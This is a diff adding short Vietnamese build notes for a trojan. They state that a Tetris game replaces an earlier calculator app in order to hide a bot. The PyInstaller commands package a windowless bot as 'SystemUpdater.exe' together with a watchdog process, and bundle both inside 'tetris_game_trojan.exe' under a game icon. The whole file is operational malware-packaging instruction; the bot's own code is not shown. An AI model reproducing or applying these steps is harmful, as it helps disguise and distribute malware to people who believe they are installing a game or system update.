@@ -1,0 +1,20 @@
+Phiên bản sẽ ko khác phiên bản V4 chỉ thay thế ứng dụng calculator bằng ứng dụng Tetris Game để che giấu
+
+====================================ĐÓNG GÓI==================================================================
+
+Thư viện cần cài đặt trước khi đóng gói "pip install cryptography"
+>>> Đóng gói bot_final.py thành SystemUpdater.exe:
+pyinstaller --noconsole --onefile --icon=SystemUpdater.ico --hidden-import=psutil --hidden-import=cryptography bot_final.py
+copy dist\bot_final.exe SystemUpdater.exe
+
+>>> Đóng gói watchdog.py thành watchdog.exe:
+pyinstaller --noconsole --onefile --icon=watchdog.ico --hidden-import=psutil watchdog.py
+copy dist\watchdog.exe watchdog.exe
+
+>>> Đóng gói tetris_game_trojan.py thành tetris_game_trojan.exe:
+pyinstaller --noconsole --onefile --icon=games_tetris.ico --add-data "SystemUpdater.exe;." --add-data "watchdog.exe;." --add-data "Sounds;Sounds" --hidden-import=psutil --hidden-import=tkinter --hidden-import=pywin32 --hidden-import=pygame --hidden-import=game --hidden-import=grid --hidden-import=blocks --hidden-import=block --hidden-import=position --hidden-import=colors tetris_game_trojan.py
+
+=============================================================================
+Chạy file .exe trong thư mục dist, đảm bảo thư mục Sounds cùng cấp vơi tetris_game_trojan.exe
+
+
